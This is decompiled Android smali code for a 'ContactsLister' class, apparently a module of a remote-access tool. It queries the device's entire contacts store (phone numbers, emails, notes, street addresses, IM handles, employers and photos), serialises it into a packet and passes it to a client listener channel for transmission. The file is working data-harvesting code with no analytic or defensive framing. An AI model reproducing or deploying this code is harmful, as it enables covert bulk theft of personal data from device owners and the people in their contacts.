.class public Lmy/app/Library/ContactsLister;
.super Ljava/lang/Object;
.source "ContactsLister.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 40
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static listContacts(Lmy/app/client/ClientListener;I[B)Z
    .locals 68
    .parameter "c"
    .parameter "channel"
    .parameter "args"

    .prologue
    .line 44
    new-instance v46, Ljava/util/ArrayList;

    invoke-direct/range {v46 .. v46}, Ljava/util/ArrayList;-><init>()V

    .line 46
    .local v46, l:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Lutils/Contact;>;"
    const/16 v60, 0x0

    .line 47
    .local v60, ret:Z
    new-instance v6, Ljava/lang/String;

    move-object/from16 v0, p2

    invoke-direct {v6, v0}, Ljava/lang/String;-><init>([B)V

    .line 49
    .local v6, WHERE_CONDITION:Ljava/lang/String;
    invoke-virtual/range {p0 .. p0}, Lmy/app/client/ClientListener;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    .line 50
    .local v3, cr:Landroid/content/ContentResolver;
    sget-object v4, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;

    const/4 v5, 0x0

    const/4 v7, 0x0

    const-string v8, " DISPLAY_NAME "

    invoke-virtual/range {v3 .. v8}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v34

    .line 52
    .local v34, cur:Landroid/database/Cursor;
    invoke-interface/range {v34 .. v34}, Landroid/database/Cursor;->getCount()I

    move-result v4

    if-lez v4, :cond_e

    .line 53
    :cond_0
    :goto_0
    invoke-interface/range {v34 .. v34}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    if-nez v4, :cond_1

    .line 186
    const/16 v60, 0x1

    .line 192
    :goto_1
    new-instance v4, LPacket/ContactsPacket;

    move-object/from16 v0, v46

    invoke-direct {v4, v0}, LPacket/ContactsPacket;-><init>(Ljava/util/ArrayList;)V

    invoke-virtual {v4}, LPacket/ContactsPacket;->build()[B

    move-result-object v4

    move-object/from16 v0, p0

    move/from16 v1, p1

    invoke-virtual {v0, v1, v4}, Lmy/app/client/ClientListener;->handleData(I[B)V

    .line 193
    return v60

    .line 54
    :cond_1
    new-instance v32, Lutils/Contact;

    invoke-direct/range {v32 .. v32}, Lutils/Contact;-><init>()V

    .line 56
    .local v32, con:Lutils/Contact;
    const-string v4, "_id"

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v39

    .line 57
    .local v39, id:Ljava/lang/String;
    const-string v4, "_id"

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v40

    .line 59
    .local v40, idlong:J
    const-string v4, "times_contacted"

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v64

    .line 60
    .local v64, times_contacted:I
    const-string v4, "last_time_contacted"

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v47

    .line 61
    .local v47, last_time_contacted:J
    const-string v4, "display_name"

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v35

    .line 62
    .local v35, disp_name:Ljava/lang/String;
    const-string v4, "starred"

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v61

    .line 64
    .local v61, starred:I
    move-object/from16 v0, v32

    move-wide/from16 v1, v40

    invoke-virtual {v0, v1, v2}, Lutils/Contact;->setId(J)V

    .line 65
    move-object/from16 v0, v32

    move-wide/from16 v1, v47

    invoke-virtual {v0, v1, v2}, Lutils/Contact;->setLast_time_contacted(J)V

    .line 66
    move-object/from16 v0, v32

    move/from16 v1, v64

    invoke-virtual {v0, v1}, Lutils/Contact;->setTimes_contacted(I)V

    .line 67
    move-object/from16 v0, v32

    move-object/from16 v1, v35

    invoke-virtual {v0, v1}, Lutils/Contact;->setDisplay_name(Ljava/lang/String;)V

    .line 68
    move-object/from16 v0, v32

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lutils/Contact;->setStarred(I)V

    .line 71
    const-string v4, "display_name"

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v49

    .line 72
    .local v49, name:Ljava/lang/String;
    const-string v4, "has_phone_number"

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v4

    if-lez v4, :cond_0

    .line 75
    sget-object v8, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const/4 v9, 0x0

    .line 76
    const-string v10, "contact_id = ?"

    const/4 v4, 0x1

    new-array v11, v4, [Ljava/lang/String;

    const/4 v4, 0x0

    aput-object v39, v11, v4

    const/4 v12, 0x0

    move-object v7, v3

    .line 75
    invoke-virtual/range {v7 .. v12}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v55

    .line 77
    .local v55, pCur:Landroid/database/Cursor;
    new-instance v57, Ljava/util/ArrayList;

    invoke-direct/range {v57 .. v57}, Ljava/util/ArrayList;-><init>()V

    .line 78
    .local v57, phones:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    :goto_2
    invoke-interface/range {v55 .. v55}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    if-nez v4, :cond_b

    .line 82
    invoke-interface/range {v55 .. v55}, Landroid/database/Cursor;->close()V

    .line 83
    move-object/from16 v0, v32

    move-object/from16 v1, v57

    invoke-virtual {v0, v1}, Lutils/Contact;->setPhones(Ljava/util/ArrayList;)V

    .line 86
    sget-object v8, Landroid/provider/ContactsContract$CommonDataKinds$Email;->CONTENT_URI:Landroid/net/Uri;

    .line 87
    const/4 v9, 0x0

    const-string v10, "contact_id = ?"

    .line 88
    const/4 v4, 0x1

    new-array v11, v4, [Ljava/lang/String;

    const/4 v4, 0x0

    aput-object v39, v11, v4

    const/4 v12, 0x0

    move-object v7, v3

    .line 86
    invoke-virtual/range {v7 .. v12}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v37

    .line 89
    .local v37, emailCur:Landroid/database/Cursor;
    invoke-interface/range {v37 .. v37}, Landroid/database/Cursor;->getCount()I

    move-result v4

    if-eqz v4, :cond_2

    .line 90
    new-instance v38, Ljava/util/ArrayList;

    invoke-direct/range {v38 .. v38}, Ljava/util/ArrayList;-><init>()V

    .line 91
    .local v38, emails:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    :goto_3
    invoke-interface/range {v37 .. v37}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    if-nez v4, :cond_c

    .line 97
    invoke-interface/range {v37 .. v37}, Landroid/database/Cursor;->close()V

    .line 98
    move-object/from16 v0, v32

    move-object/from16 v1, v38

    invoke-virtual {v0, v1}, Lutils/Contact;->setEmails(Ljava/util/ArrayList;)V

    .line 102
    .end local v38           #emails:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    :cond_2
    const-string v10, "contact_id = ? AND mimetype = ?"

    .line 103
    .local v10, noteWhere:Ljava/lang/String;
    const/4 v4, 0x2

    new-array v11, v4, [Ljava/lang/String;

    const/4 v4, 0x0

    aput-object v39, v11, v4

    const/4 v4, 0x1

    const-string v5, "vnd.android.cursor.item/note"

    aput-object v5, v11, v4

    .line 104
    .local v11, noteWhereParams:[Ljava/lang/String;
    sget-object v8, Landroid/provider/ContactsContract$Data;->CONTENT_URI:Landroid/net/Uri;

    const/4 v9, 0x0

    const/4 v12, 0x0

    move-object v7, v3

    invoke-virtual/range {v7 .. v12}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v51

    .line 105
    .local v51, noteCur:Landroid/database/Cursor;
    invoke-interface/range {v51 .. v51}, Landroid/database/Cursor;->getCount()I

    move-result v4

    if-eqz v4, :cond_4

    .line 106
    new-instance v52, Ljava/util/ArrayList;

    invoke-direct/range {v52 .. v52}, Ljava/util/ArrayList;-><init>()V

    .line 107
    .local v52, notes:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    invoke-interface/range {v51 .. v51}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v4

    if-eqz v4, :cond_3

    .line 108
    const-string v4, "data1"

    move-object/from16 v0, v51

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v51

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v50

    .line 109
    .local v50, note:Ljava/lang/String;
    move-object/from16 v0, v52

    move-object/from16 v1, v50

    invoke-virtual {v0, v1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 111
    .end local v50           #note:Ljava/lang/String;
    :cond_3
    invoke-interface/range {v51 .. v51}, Landroid/database/Cursor;->close()V

    .line 112
    move-object/from16 v0, v32

    move-object/from16 v1, v52

    invoke-virtual {v0, v1}, Lutils/Contact;->setNotes(Ljava/util/ArrayList;)V

    .line 117
    .end local v52           #notes:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    :cond_4
    const-string v15, "contact_id = ? AND mimetype = ?"

    .line 118
    .local v15, addrWhere:Ljava/lang/String;
    const/4 v4, 0x2

    new-array v0, v4, [Ljava/lang/String;

    move-object/from16 v16, v0

    const/4 v4, 0x0

    aput-object v39, v16, v4

    const/4 v4, 0x1

    const-string v5, "vnd.android.cursor.item/postal-address_v2"

    aput-object v5, v16, v4

    .line 119
    .local v16, addrWhereParams:[Ljava/lang/String;
    sget-object v13, Landroid/provider/ContactsContract$Data;->CONTENT_URI:Landroid/net/Uri;

    const/4 v14, 0x0

    const/16 v17, 0x0

    move-object v12, v3

    invoke-virtual/range {v12 .. v17}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v28

    .line 121
    .local v28, addrCur:Landroid/database/Cursor;
    invoke-interface/range {v28 .. v28}, Landroid/database/Cursor;->getCount()I

    move-result v4

    if-eqz v4, :cond_5

    .line 122
    :goto_4
    invoke-interface/range {v28 .. v28}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    if-nez v4, :cond_d

    .line 137
    invoke-interface/range {v28 .. v28}, Landroid/database/Cursor;->close()V

    .line 141
    :cond_5
    const-string v20, "contact_id = ? AND mimetype = ?"

    .line 142
    .local v20, imWhere:Ljava/lang/String;
    const/4 v4, 0x2

    new-array v0, v4, [Ljava/lang/String;

    move-object/from16 v21, v0

    const/4 v4, 0x0

    aput-object v39, v21, v4

    const/4 v4, 0x1

    const-string v5, "vnd.android.cursor.item/im"

    aput-object v5, v21, v4

    .line 143
    .local v21, imWhereParams:[Ljava/lang/String;
    sget-object v18, Landroid/provider/ContactsContract$Data;->CONTENT_URI:Landroid/net/Uri;

    const/16 v19, 0x0

    const/16 v22, 0x0

    move-object/from16 v17, v3

    invoke-virtual/range {v17 .. v22}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v42

    .line 144
    .local v42, imCur:Landroid/database/Cursor;
    invoke-interface/range {v42 .. v42}, Landroid/database/Cursor;->getCount()I

    move-result v4

    if-eqz v4, :cond_7

    .line 145
    new-instance v44, Ljava/util/ArrayList;

    invoke-direct/range {v44 .. v44}, Ljava/util/ArrayList;-><init>()V

    .line 146
    .local v44, ims:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    invoke-interface/range {v42 .. v42}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v4

    if-eqz v4, :cond_6

    .line 147
    const-string v4, "data1"

    move-object/from16 v0, v42

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v42

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v43

    .line 149
    .local v43, imName:Ljava/lang/String;
    move-object/from16 v0, v44

    move-object/from16 v1, v43

    invoke-virtual {v0, v1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 151
    .end local v43           #imName:Ljava/lang/String;
    :cond_6
    invoke-interface/range {v42 .. v42}, Landroid/database/Cursor;->close()V

    .line 152
    move-object/from16 v0, v32

    move-object/from16 v1, v44

    invoke-virtual {v0, v1}, Lutils/Contact;->setMessaging(Ljava/util/ArrayList;)V

    .line 156
    .end local v44           #ims:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    :cond_7
    const-string v25, "contact_id = ? AND mimetype = ?"

    .line 157
    .local v25, orgWhere:Ljava/lang/String;
    const/4 v4, 0x2

    new-array v0, v4, [Ljava/lang/String;

    move-object/from16 v26, v0

    const/4 v4, 0x0

    aput-object v39, v26, v4

    const/4 v4, 0x1

    const-string v5, "vnd.android.cursor.item/organization"

    aput-object v5, v26, v4

    .line 158
    .local v26, orgWhereParams:[Ljava/lang/String;
    sget-object v23, Landroid/provider/ContactsContract$Data;->CONTENT_URI:Landroid/net/Uri;

    const/16 v24, 0x0

    const/16 v27, 0x0

    move-object/from16 v22, v3

    invoke-virtual/range {v22 .. v27}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v53

    .line 159
    .local v53, orgCur:Landroid/database/Cursor;
    invoke-interface/range {v53 .. v53}, Landroid/database/Cursor;->getCount()I

    move-result v4

    if-eqz v4, :cond_9

    .line 160
    invoke-interface/range {v53 .. v53}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v4

    if-eqz v4, :cond_8

    .line 161
    const-string v4, "data1"

    move-object/from16 v0, v53

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v53

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v54

    .line 162
    .local v54, orgName:Ljava/lang/String;
    const-string v4, "data4"

    move-object/from16 v0, v53

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v53

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v65

    .line 164
    .local v65, title:Ljava/lang/String;
    move-object/from16 v0, v32

    move-object/from16 v1, v54

    invoke-virtual {v0, v1}, Lutils/Contact;->setOrganisationName(Ljava/lang/String;)V

    .line 165
    move-object/from16 v0, v32

    move-object/from16 v1, v65

    invoke-virtual {v0, v1}, Lutils/Contact;->setOrganisationStatus(Ljava/lang/String;)V

    .line 167
    .end local v54           #orgName:Ljava/lang/String;
    .end local v65           #title:Ljava/lang/String;
    :cond_8
    invoke-interface/range {v53 .. v53}, Landroid/database/Cursor;->close()V

    .line 171
    :cond_9
    sget-object v4, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;

    move-wide/from16 v0, v40

    invoke-static {v4, v0, v1}, Landroid/content/ContentUris;->withAppendedId(Landroid/net/Uri;J)Landroid/net/Uri;

    move-result-object v67

    .line 172
    .local v67, uri:Landroid/net/Uri;
    move-object/from16 v0, v67

    invoke-static {v3, v0}, Landroid/provider/ContactsContract$Contacts;->openContactPhotoInputStream(Landroid/content/ContentResolver;Landroid/net/Uri;)Ljava/io/InputStream;

    move-result-object v45

    .line 173
    .local v45, input:Ljava/io/InputStream;
    if-eqz v45, :cond_a

    .line 174
    invoke-static/range {v45 .. v45}, Landroid/graphics/BitmapFactory;->decodeStream(Ljava/io/InputStream;)Landroid/graphics/Bitmap;

    move-result-object v58

    .line 176
    .local v58, pic:Landroid/graphics/Bitmap;
    new-instance v30, Ljava/io/ByteArrayOutputStream;

    invoke-direct/range {v30 .. v30}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 177
    .local v30, bos:Ljava/io/ByteArrayOutputStream;
    sget-object v4, Landroid/graphics/Bitmap$CompressFormat;->PNG:Landroid/graphics/Bitmap$CompressFormat;

    const/4 v5, 0x0

    move-object/from16 v0, v58

    move-object/from16 v1, v30

    invoke-virtual {v0, v4, v5, v1}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 178
    invoke-virtual/range {v30 .. v30}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v29

    .line 179
    .local v29, bitmapdata:[B
    move-object/from16 v0, v32

    move-object/from16 v1, v29

    invoke-virtual {v0, v1}, Lutils/Contact;->setPhoto([B)V

    .line 182
    .end local v29           #bitmapdata:[B
    .end local v30           #bos:Ljava/io/ByteArrayOutputStream;
    .end local v58           #pic:Landroid/graphics/Bitmap;
    :cond_a
    move-object/from16 v0, v46

    move-object/from16 v1, v32

    invoke-virtual {v0, v1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto/16 :goto_0

    .line 79
    .end local v10           #noteWhere:Ljava/lang/String;
    .end local v11           #noteWhereParams:[Ljava/lang/String;
    .end local v15           #addrWhere:Ljava/lang/String;
    .end local v16           #addrWhereParams:[Ljava/lang/String;
    .end local v20           #imWhere:Ljava/lang/String;
    .end local v21           #imWhereParams:[Ljava/lang/String;
    .end local v25           #orgWhere:Ljava/lang/String;
    .end local v26           #orgWhereParams:[Ljava/lang/String;
    .end local v28           #addrCur:Landroid/database/Cursor;
    .end local v37           #emailCur:Landroid/database/Cursor;
    .end local v42           #imCur:Landroid/database/Cursor;
    .end local v45           #input:Ljava/io/InputStream;
    .end local v51           #noteCur:Landroid/database/Cursor;
    .end local v53           #orgCur:Landroid/database/Cursor;
    .end local v67           #uri:Landroid/net/Uri;
    :cond_b
    const-string v4, "data1"

    move-object/from16 v0, v55

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v55

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v56

    .line 80
    .local v56, phone:Ljava/lang/String;
    move-object/from16 v0, v57

    move-object/from16 v1, v56

    invoke-virtual {v0, v1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto/16 :goto_2

    .line 93
    .end local v56           #phone:Ljava/lang/String;
    .restart local v37       #emailCur:Landroid/database/Cursor;
    .restart local v38       #emails:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    :cond_c
    const-string v4, "data1"

    move-object/from16 v0, v37

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v37

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v36

    .line 95
    .local v36, email:Ljava/lang/String;
    move-object/from16 v0, v38

    move-object/from16 v1, v36

    invoke-virtual {v0, v1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto/16 :goto_3

    .line 123
    .end local v36           #email:Ljava/lang/String;
    .end local v38           #emails:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    .restart local v10       #noteWhere:Ljava/lang/String;
    .restart local v11       #noteWhereParams:[Ljava/lang/String;
    .restart local v15       #addrWhere:Ljava/lang/String;
    .restart local v16       #addrWhereParams:[Ljava/lang/String;
    .restart local v28       #addrCur:Landroid/database/Cursor;
    .restart local v51       #noteCur:Landroid/database/Cursor;
    :cond_d
    const-string v4, "data4"

    move-object/from16 v0, v28

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v28

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v63

    .line 124
    .local v63, street:Ljava/lang/String;
    const-string v4, "data7"

    move-object/from16 v0, v28

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v28

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v31

    .line 125
    .local v31, city:Ljava/lang/String;
    const-string v4, "data8"

    move-object/from16 v0, v28

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v28

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v62

    .line 126
    .local v62, state:Ljava/lang/String;
    const-string v4, "data9"

    move-object/from16 v0, v28

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v28

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v59

    .line 127
    .local v59, postalCode:Ljava/lang/String;
    const-string v4, "data10"

    move-object/from16 v0, v28

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v28

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v33

    .line 128
    .local v33, country:Ljava/lang/String;
    const-string v4, "data2"

    move-object/from16 v0, v28

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v28

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v66

    .line 130
    .local v66, type:I
    move-object/from16 v0, v32

    move-object/from16 v1, v63

    invoke-virtual {v0, v1}, Lutils/Contact;->setStreet(Ljava/lang/String;)V

    .line 131
    move-object/from16 v0, v32

    move-object/from16 v1, v31

    invoke-virtual {v0, v1}, Lutils/Contact;->setCity(Ljava/lang/String;)V

    .line 132
    move-object/from16 v0, v32

    move-object/from16 v1, v62

    invoke-virtual {v0, v1}, Lutils/Contact;->setRegion(Ljava/lang/String;)V

    .line 133
    move-object/from16 v0, v32

    move-object/from16 v1, v59

    invoke-virtual {v0, v1}, Lutils/Contact;->setPostalcode(Ljava/lang/String;)V

    .line 134
    invoke-virtual/range {v32 .. v33}, Lutils/Contact;->setCountry(Ljava/lang/String;)V

    .line 135
    move-object/from16 v0, v32

    move/from16 v1, v66

    invoke-virtual {v0, v1}, Lutils/Contact;->setType_addr(I)V

    goto/16 :goto_4

    .line 189
    .end local v10           #noteWhere:Ljava/lang/String;
    .end local v11           #noteWhereParams:[Ljava/lang/String;
    .end local v15           #addrWhere:Ljava/lang/String;
    .end local v16           #addrWhereParams:[Ljava/lang/String;
    .end local v28           #addrCur:Landroid/database/Cursor;
    .end local v31           #city:Ljava/lang/String;
    .end local v32           #con:Lutils/Contact;
    .end local v33           #country:Ljava/lang/String;
    .end local v35           #disp_name:Ljava/lang/String;
    .end local v37           #emailCur:Landroid/database/Cursor;
    .end local v39           #id:Ljava/lang/String;
    .end local v40           #idlong:J
    .end local v47           #last_time_contacted:J
    .end local v49           #name:Ljava/lang/String;
    .end local v51           #noteCur:Landroid/database/Cursor;
    .end local v55           #pCur:Landroid/database/Cursor;
    .end local v57           #phones:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    .end local v59           #postalCode:Ljava/lang/String;
    .end local v61           #starred:I
    .end local v62           #state:Ljava/lang/String;
    .end local v63           #street:Ljava/lang/String;
    .end local v64           #times_contacted:I
    .end local v66           #type:I
    :cond_e
    const/16 v60, 0x0

    goto/16 :goto_1
.end method
